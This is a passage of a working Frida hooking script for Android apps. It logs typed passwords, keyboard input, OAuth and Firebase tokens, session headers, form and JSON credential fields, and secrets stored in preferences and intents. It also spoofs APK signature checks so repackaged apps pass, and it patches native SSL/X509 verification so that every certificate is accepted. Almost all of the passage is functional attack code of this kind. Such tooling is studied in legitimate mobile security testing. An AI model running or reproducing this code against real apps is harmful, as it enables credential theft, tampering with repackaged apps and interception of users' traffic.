        ov.implementation = function (cmd, args) {
          log('[TWA-SVC] onExtraCommand cmd="' + cmd + '"');
          try {
            if (args) {
              args.keySet().toArray().forEach(function (k) {
                log('  [TWA-SVC] ' + k + ' = ' + clip(args.get(k), 300));
              });
            }
          } catch (_) {}
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}

    try {
      const CTI = Java.use('androidx.browser.customtabs.CustomTabsIntent');
      CTI.launchUrl.overloads.forEach(function (ov) {
        ov.implementation = function (ctx, uri) {
          log('[TWA-LAUNCH] ' + uri.toString());
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}

    try {
      const CTS = Java.use('androidx.browser.customtabs.CustomTabsSession');
      CTS.sendExtraCommand.overloads.forEach(function (ov) {
        ov.implementation = function (cmd, bundle) {
          log('[TWA-SESSION] ' + cmd);
          try {
            if (bundle) {
              bundle.keySet().toArray().forEach(function (k) {
                log('  [TWA-SESSION] ' + k + ' = ' + clip(bundle.get(k), 300));
              });
            }
          } catch (_) {}
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}

    try {
      const PMS = Java.use('androidx.browser.customtabs.PostMessageService');
      PMS.onPostMessage.overloads.forEach(function (ov) {
        ov.implementation = function (ch, msg) {
          log('[TWA-PM] ' + clip(msg, 500));
          return ov.call(this, ...arguments);
        };
      });
      PMS.onMessageChannelReady.overloads.forEach(function (ov) {
        ov.implementation = function () {
          log('[TWA-PM] channel ready');
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}
  })();

  /* ============ 11. Credential capture ============ */
  if (CONFIG.credentialCapture) (function creds() {
    try {
      const PTM = Java.use('android.text.method.PasswordTransformationMethod');
      const orig = PTM.getTransformation.overload(
        'java.lang.CharSequence',
        'android.view.View'
      );
      orig.implementation = function (source, view) {
        try {
          const s = source ? source.toString() : '';
          if (s.length > 0) {
            let hint = '';
            try { hint = view && view.getHint ? view.getHint().toString() : ''; } catch (_) {}
            log('[PWD] "' + clip(s) + '"  hint="' + clip(hint, 100) + '"');
          }
        } catch (_) {}
        return orig.call(this, source, view);
      };
    } catch (_) {}

    try {
      const TV = Java.use('android.widget.TextView');
      const orig = TV.getText;
      orig.implementation = function () {
        const ret = orig.call(this);
        try {
          const clsName = this.$className || '';
          let it = 0;
          try { it = this.getInputType(); } catch (_) {}
          if (clsName.indexOf('EditText') === -1 &&
              clsName.indexOf('TextInputEditText') === -1 &&
              (it & 0xff) === 0) return ret;

          const s = ret ? ret.toString() : '';
          if (!s || s.length > 500) return ret;

          let hint = '';
          try { hint = this.getHint() ? this.getHint().toString() : ''; } catch (_) {}

          let resId = '';
          try { resId = this.getResources().getResourceEntryName(this.getId()); } catch (_) {}

          const label = (clsName + ' ' + hint + ' ' + resId).toLowerCase();
          const isPwd = ((it & 0x80) !== 0) || ((it & 0x10) !== 0);
          const isEmail = ((it & 0x20) !== 0) || ((it & 0xd0) === 0xd0);

          if (isPwd || /pass|pwd|pin|otp|secret|token/.test(label)) {
            throttled('pwd-' + resId + hint, 500,
              '[PWD-FIELD] "' + clip(s) + '"  id=' + resId + ' hint="' + clip(hint, 100) + '"');
          } else if (isEmail || /email|user|login|account|name|phone|mobile/.test(label)) {
            throttled('usr-' + resId + hint, 500,
              '[USER-FIELD] "' + clip(s) + '"  id=' + resId + ' hint="' + clip(hint, 100) + '"');
          }
        } catch (_) {}
        return ret;
      };
    } catch (_) {}

    try {
      const TV2 = Java.use('android.widget.TextView');
      const orig = TV2.setText.overload('java.lang.CharSequence');
      orig.implementation = function (text) {
        try {
          const s = text ? text.toString() : '';
          if (s.length > 0 && s.length < 500) {
            let it = 0;
            try { it = this.getInputType(); } catch (_) {}
            if ((it & 0x80) !== 0 || (it & 0x10) !== 0) {
              log('[PWD-SETTEXT] "' + clip(s) + '"');
            }
          }
        } catch (_) {}
        return orig.call(this, text);
      };
    } catch (_) {}

    try {
      const BIC = Java.use('android.view.inputmethod.BaseInputConnection');
      const orig = BIC.commitText;
      orig.implementation = function (text, pos) {
        try {
          const s = text ? text.toString() : '';
          if (s.trim().length > 0) throttled('ime', 300, '[IME] "' + clip(s) + '"');
        } catch (_) {}
        return orig.call(this, text, pos);
      };
    } catch (_) {}

    try {
      const AFM = Java.use('android.view.autofill.AutofillManager');
      AFM.notifyViewEntered.overloads.forEach(function (ov) {
        ov.implementation = function () {
          try {
            const view = arguments[0];
            const clsName = view.getClass().getName();
            if (clsName.indexOf('EditText') !== -1) {
              let hint = '';
              try { hint = view.getHint ? view.getHint().toString() : ''; } catch (_) {}
              log('[AUTOFILL] ' + clsName + ' hint="' + clip(hint, 100) + '"');
            }
          } catch (_) {}
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}

    try {
      const GSA = Java.use('com.google.android.gms.auth.api.signin.GoogleSignInAccount');
      const getEmail = GSA.getEmail;
      getEmail.implementation = function () {
        const r = getEmail.call(this);
        if (r) log('[GSI] email=' + r);
        return r;
      };
      const getIdToken = GSA.getIdToken;
      getIdToken.implementation = function () {
        const r = getIdToken.call(this);
        if (r) log('[GSI] idToken=' + clip(r));
        return r;
      };
    } catch (_) {}

    try {
      const AT = Java.use('com.facebook.AccessToken');
      const getCurrent = AT.getCurrentAccessToken;
      getCurrent.implementation = function () {
        const r = getCurrent.call(this);
        if (r) {
          try { log('[FB] token=' + clip(r.getToken())); } catch (_) {}
          try { log('[FB] userId=' + r.getUserId()); } catch (_) {}
        }
        return r;
      };
    } catch (_) {}

    try {
      const FA = Java.use('com.google.firebase.auth.FirebaseAuth');
      const getCurrentUser = FA.getCurrentUser;
      getCurrentUser.implementation = function () {
        const u = getCurrentUser.call(this);
        if (u) {
          try { log('[FIREBASE] email=' + u.getEmail()); } catch (_) {}
          try { log('[FIREBASE] uid=' + u.getUid()); } catch (_) {}
        }
        return u;
      };
    } catch (_) {}

    [
      'androidx.credentials.CredentialManager',
      'androidx.credentials.CredentialManagerImpl',
      'android.credentials.CredentialManager',
    ].forEach(function (cn) {
      try {
        const CM = Java.use(cn);
        ['getCredential', 'saveCredential', 'createCredential'].forEach(function (m) {
          try {
            CM[m].overloads.forEach(function (ov) {
              ov.implementation = function () {
                log('[CREDMGR] ' + m);
                for (let i = 0; i < arguments.length; i++) {
                  try {
                    if (arguments[i] !== null) {
                      log('  [CREDMGR] ' + clip(arguments[i], 300));
                    }
                  } catch (_) {}
                }
                return ov.call(this, ...arguments);
              };
            });
          } catch (_) {}
        });
      } catch (_) {}
    });

    try {
      const AM = Java.use('android.accounts.AccountManager');
      const getAccounts = AM.getAccounts;
      getAccounts.implementation = function () {
        const r = getAccounts.call(this);
        if (r) {
          for (let i = 0; i < r.length; i++) {
            try { log('[ACCMGR] ' + r[i].type + '/' + r[i].name); } catch (_) {}
          }
        }
        return r;
      };
    } catch (_) {}
  })();

  /* ============ 12. HTTP capture ============ */
  if (CONFIG.httpCapture) (function http() {
    try {
      const Req = Java.use('okhttp3.Request');
      Req.header.overloads.forEach(function (ov) {
        ov.implementation = function (name) {
          const r = ov.call(this, ...arguments);
          try {
            if (r && /auth|cookie|token|pass|user|session|bearer/i.test(String(name))) {
              log('[OKHTTP-HDR] ' + name + ': ' + clip(r));
            }
          } catch (_) {}
          return r;
        };
      });

      Req.url.overloads.forEach(function (ov) {
        ov.implementation = function () {
          const u = ov.call(this, ...arguments);
          try { throttled('okurl', 100, '[OKHTTP-URL] ' + u.toString()); } catch (_) {}
          return u;
        };
      });
    } catch (_) {}

    try {
      const FormBody = Java.use('okhttp3.FormBody');
      const orig = FormBody.toString;
      orig.implementation = function () {
        const s = orig.call(this);
        log('[FORM] ' + clip(s, 800));
        return s;
      };
    } catch (_) {}

    try {
      const FBB = Java.use('okhttp3.FormBody$Builder');
      const add = FBB.add;
      add.implementation = function (k, v) {
        log('[FORM] ' + k + ' = ' + clip(v));
        return add.call(this, k, v);
      };
    } catch (_) {}

    try {
      const MPB = Java.use('okhttp3.MultipartBody$Builder');
      MPB.addFormDataPart.overloads.forEach(function (ov) {
        ov.implementation = function (name, value) {
          log('[MULTIPART] ' + name + ' = ' + clip(value));
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}

    try {
      const UC = Java.use('java.net.URLConnection');
      const setRequestProperty = UC.setRequestProperty;
      setRequestProperty.implementation = function (k, v) {
        log('[HTTP-HDR] ' + k + ': ' + clip(v));
        return setRequestProperty.call(this, k, v);
      };
    } catch (_) {}

    try {
      const URL = Java.use('java.net.URL');
      URL.openConnection.overloads.forEach(function (ov) {
        ov.implementation = function () {
          try {
            const u = this.toString();
            throttled('url-' + u, 200, '[URL] ' + u);
          } catch (_) {}
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}

    try {
      const RB = Java.use('retrofit2.RequestBuilder');
      const build = RB.build;
      build.implementation = function () {
        const r = build.call(this);
        try { log('[RETROFIT] ' + clip(r.toString(), 800)); } catch (_) {}
        return r;
      };
    } catch (_) {}

    try {
      const JObj = Java.use('org.json.JSONObject');
      JObj.put.overloads.forEach(function (ov) {
        ov.implementation = function (k, v) {
          try {
            if (k && /pass|pwd|pin|otp|secret|token|auth|user|email|login|name|phone/i.test(String(k))) {
              log('[JSON] ' + k + ' = ' + clip(v, 300));
            }
          } catch (_) {}
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}
  })();

  /* ============ 13. Intent / Bundle / Prefs / Log ============ */
  try {
    const Intent = Java.use('android.content.Intent');
    const orig = Intent.getStringExtra;
    orig.implementation = function (k) {
      const r = orig.call(this, k);
      try {
        if (r && r.length < 500) log('[INTENT] ' + k + ' = ' + clip(r));
      } catch (_) {}
      return r;
    };
  } catch (_) {}

  try {
    const Bundle = Java.use('android.os.Bundle');
    const orig = Bundle.getString;
    orig.implementation = function (k) {
      const r = orig.call(this, k);
      try {
        if (r && k && r.length < 500 &&
            /pass|pwd|token|auth|user|email|login|name|phone|code|otp|secret/i.test(k)) {
          log('[BUNDLE] ' + k + ' = ' + clip(r));
        }
      } catch (_) {}
      return r;
    };
  } catch (_) {}

  try {
    const SPI = Java.use('android.app.SharedPreferencesImpl');
    const orig = SPI.getString;
    orig.implementation = function (k, def) {
      const r = orig.call(this, k, def);
      try {
        if (r && k && r.length < 500 &&
            /pass|pwd|token|auth|user|email|login|name|phone|otp|secret/i.test(k)) {
          log('[PREFS] ' + k + ' = ' + clip(r));
        }
      } catch (_) {}
      return r;
    };
  } catch (_) {}

  try {
    const Log = Java.use('android.util.Log');
    ['d', 'i', 'w', 'v'].forEach(function (lvl) {
      try {
        const orig = Log[lvl].overload('java.lang.String', 'java.lang.String');
        orig.implementation = function (tag, msg) {
          try {
            if (msg && msg.length < 800 &&
                /pass|pwd|token|auth|bearer|user|email|login|secret|credential/i.test(msg)) {
              throttled('log-' + tag + lvl, 500,
                '[LOG-' + lvl.toUpperCase() + '] ' + tag + ': ' + clip(msg));
            }
          } catch (_) {}
          return orig.call(this, tag, msg);
        };
      } catch (_) {}
    });
  } catch (_) {}

  /* ============ 14. APK signature bypass ============ */
  (function apkSignatureBypass() {
    if (!CONFIG.apkSignatureBypass) {
      log('[*] APK signature bypass disabled (CONFIG.apkSignatureBypass=false)');
      return;
    }

    const b64 = String(CONFIG.originalCertB64 || '').replace(/\s+/g, '');
    if (!b64 || b64.indexOf('REPLACE_ME') !== -1) {
      log('[-] APK signature bypass skipped: CONFIG.originalCertB64 is not configured');
      return;
    }

    function b64ToBytes(input) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
      const lookup = {};
      for (let i = 0; i < chars.length; i++) lookup[chars[i]] = i;

      const bytes = [];
      let buffer = 0;
      let bits = 0;

      for (let i = 0; i < input.length; i++) {
        const c = input[i];
        if (c === '=') break;
        const v = lookup[c];
        if (v === undefined) continue;
        buffer = (buffer << 6) | v;
        bits += 6;
        if (bits >= 8) {
          bits -= 8;
          bytes.push((buffer >> bits) & 0xff);
          buffer &= (1 << bits) - 1;
        }
      }
      return bytes;
    }

    let originalCertBytes;
    try {
      originalCertBytes = b64ToBytes(b64);
      log('[+] Original cert loaded (' + originalCertBytes.length + ' bytes)');
    } catch (e) {
      log('[-] Failed to decode cert Base64: ' + e);
      return;
    }

    let legitSignature;
    let legitHash;
    let legitBytes;
    let legitChars;
    try {
      const Signature = Java.use('android.content.pm.Signature');
      legitSignature = Signature.$new(Java.array('byte', originalCertBytes));
      legitHash = legitSignature.hashCode();
      legitBytes = legitSignature.toByteArray();
      legitChars = legitSignature.toCharsString();
      log('[+] Legitimate Signature object created');
    } catch (e) {
      log('[-] Failed to create Signature: ' + e);
      return;
    }

    const sigArray = Java.array('android.content.pm.Signature', [legitSignature]);

    hook('PackageManager.getPackageInfo -> original signatures', function () {
      const PM = Java.use('android.app.ApplicationPackageManager');
      ['getPackageInfo', 'getPackageArchiveInfo'].forEach(function (method) {
        try {
          PM[method].overloads.forEach(function (ov) {
            const orig = ov;
            ov.implementation = function () {
              const info = orig.call(this, ...arguments);
              try { info.signatures.value = sigArray; } catch (_) {}
              return info;
            };
          });
        } catch (_) {}
      });
    });

    hook('PackageManager.getInstalledPackages -> original signatures', function () {
      const PM = Java.use('android.app.ApplicationPackageManager');
      PM.getInstalledPackages.overloads.forEach(function (ov) {
        const orig = ov;
        ov.implementation = function () {
          const list = orig.call(this, ...arguments);
          try {
            for (let i = 0; i < list.size(); i++) {
              const pi = list.get(i);
              try { pi.signatures.value = sigArray; } catch (_) {}
            }
          } catch (_) {}
          return list;
        };
      });
    });

    hook('SigningInfo -> original signatures', function () {
      const SI = Java.use('android.content.pm.SigningInfo');
      ['getApkContentsSigners', 'getSigningCertificateHistory'].forEach(function (m) {
        try {
          SI[m].overloads.forEach(function (ov) {
            ov.implementation = function () { return sigArray; };
          });
        } catch (_) {}
      });
      ['hasMultipleSigners', 'hasPastSigningCertificates'].forEach(function (m) {
        try {
          SI[m].overloads.forEach(function (ov) {
            ov.implementation = function () { return false; };
          });
        } catch (_) {}
      });
    });

    hook('Signature comparison methods', function () {
      const Signature = Java.use('android.content.pm.Signature');

      const hashCode = Signature.hashCode;
      hashCode.implementation = function () {
        try { return legitHash; } catch (_) { return hashCode.call(this); }
      };

      const toByteArray = Signature.toByteArray;
      toByteArray.implementation = function () {
        try { return legitBytes; } catch (_) { return toByteArray.call(this); }
      };

      const toCharsString = Signature.toCharsString;
      toCharsString.implementation = function () {
        try { return legitChars; } catch (_) { return toCharsString.call(this); }
      };

      try {
        Signature.equals.implementation = function (obj) { return obj !== null; };
      } catch (_) {}
    });

    hook('PackageManager.checkSignatures -> match', function () {
      const PM = Java.use('android.app.ApplicationPackageManager');
      PM.checkSignatures.overloads.forEach(function (ov) {
        ov.implementation = function () { return 0; };
      });
    });

    log('[*] APK signature bypass installed');
  })();

  log('[*] Java layer done');
});

/* ------------------------------------------------------------------ */
/*  Native layer (Frida 17 compatible export lookup)                  */
/* ------------------------------------------------------------------ */
const alwaysOk = new NativeCallback(function () { return 0; }, 'int', ['pointer', 'pointer']);
const alwaysOkCert = new NativeCallback(function () { return 1; }, 'int', ['pointer', 'pointer']);
const _patched = Object.create(null);

function patchNative(lib) {
  if (_patched[lib]) return;

  let mod;
  try { mod = Process.findModuleByName(lib); } catch (_) { return; }
  if (!mod) return;

  _patched[lib] = 1;

  const find = function (name) {
    try { return mod.findExportByName(name); } catch (_) { return null; }
  };

  ['SSL_CTX_set_custom_verify', 'SSL_set_custom_verify'].forEach(function (name) {
    const addr = find(name);
    if (addr) {
      Interceptor.attach(addr, {
        onEnter: function (args) { args[2] = alwaysOk; },
      });
      log('[+] ' + lib + ' ' + name + ' -> always OK');
    }
  });

  ['SSL_CTX_set_verify', 'SSL_set_verify'].forEach(function (name) {
    const addr = find(name);
    if (addr) {
      Interceptor.attach(addr, {
        onEnter: function (args) {
          args[1] = ptr(0);
          args[2] = ptr(0);
        },
      });
      log('[+] ' + lib + ' ' + name + ' neutralised');
    }
  });

  const getResult = find('SSL_get_verify_result');
  if (getResult) {
    Interceptor.attach(getResult, {
      onLeave: function (retval) { retval.replace(0); },
    });
    log('[+] ' + lib + ' SSL_get_verify_result -> X509_V_OK');
  }

  const certCb = find('SSL_CTX_set_cert_verify_callback');
  if (certCb) {
    Interceptor.attach(certCb, {
      onEnter: function (args) { args[1] = alwaysOkCert; },
    });
    log('[+] ' + lib + ' SSL_CTX_set_cert_verify_callback -> always 1');
  }

  const flutterVerify = find('ssl_crypto_x509_session_verify_cert_chain');
  if (flutterVerify) {
    Interceptor.attach(flutterVerify, {
      onLeave: function (retval) { retval.replace(1); },
    });
    log('[+] ' + lib + ' ssl_crypto_x509_session_verify_cert_chain -> 1');
  }

  const x509Verify = find('X509_verify_cert');
  if (x509Verify) {
    Interceptor.attach(x509Verify, {
      onLeave: function (retval) { retval.replace(1); },
    });
    log('[+] ' + lib + ' X509_verify_cert -> 1');
  }

  log('[+] native patched: ' + lib);
}

CONFIG.nativeLibs.forEach(patchNative);

const _watcher = setInterval(function () {
  CONFIG.nativeLibs.forEach(patchNative);
}, CONFIG.nativePollMs);

setTimeout(function () {
  clearInterval(_watcher);
  log('[*] Native watcher stopped');
}, CONFIG.nativeDurationMs);
